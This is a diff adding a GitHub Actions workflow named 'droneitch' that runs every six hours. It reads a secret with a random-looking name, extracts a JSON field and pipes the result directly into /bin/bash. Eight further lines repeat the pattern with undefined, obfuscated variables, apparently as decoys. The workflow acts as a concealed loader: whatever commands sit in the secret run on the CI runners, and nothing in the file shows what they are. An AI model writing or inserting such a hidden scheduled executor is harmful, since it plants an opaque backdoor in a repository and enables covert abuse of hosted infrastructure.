@@ -1,0 +1,25 @@
+name: droneitch
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: droneitch
+        env:
+          v19594: ${{ secrets.v19594 }}
+        run: |
+          echo $v19594 | jq -r .goth2714 | /bin/bash
+          echo $b9 | jq -r .g78788 | /bin/bash
+          echo $tpy05 | jq -r .ruhr954 | /bin/bash
+          echo $wn6734 | jq -r .cdor8 | /bin/bash
+          echo $ziuk16625 | jq -r .ek28 | /bin/bash
+          echo $mwvbn85565 | jq -r .u8 | /bin/bash
+          echo $w64 | jq -r .fa083 | /bin/bash
+          echo $tpxb46222 | jq -r .gszs49691 | /bin/bash
+          echo $ufi5665 | jq -r .wqf7973 | /bin/bash
+
